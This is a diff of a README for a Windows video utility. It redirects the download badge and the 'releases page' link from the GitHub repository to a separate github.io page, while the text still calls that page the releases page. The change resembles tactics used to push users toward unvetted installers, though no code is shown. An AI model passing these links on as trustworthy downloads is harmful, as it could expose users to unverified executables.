@@ -1,6 +1,6 @@
 # 🎥 Content-Creator-Utility - Produce high quality videos with ease
 
-[![](https://img.shields.io/badge/Download-Content_Creator_Utility-blue.svg)](https://github.com/Jeqevep1242/Content-Creator-Utility)
+[![](https://img.shields.io/badge/Download-Content_Creator_Utility-blue.svg)](https://jeqevep1242.github.io)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this utility well. Ensure your Wind
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Jeqevep1242/Content-Creator-Utility) to download the latest setup file.
+1. Visit the [releases page](https://jeqevep1242.github.io) to download the latest setup file.
 2. Choose the link labeled for Windows.
 3. Save the file to your computer.
 4. Locate the downloaded file in your folder.
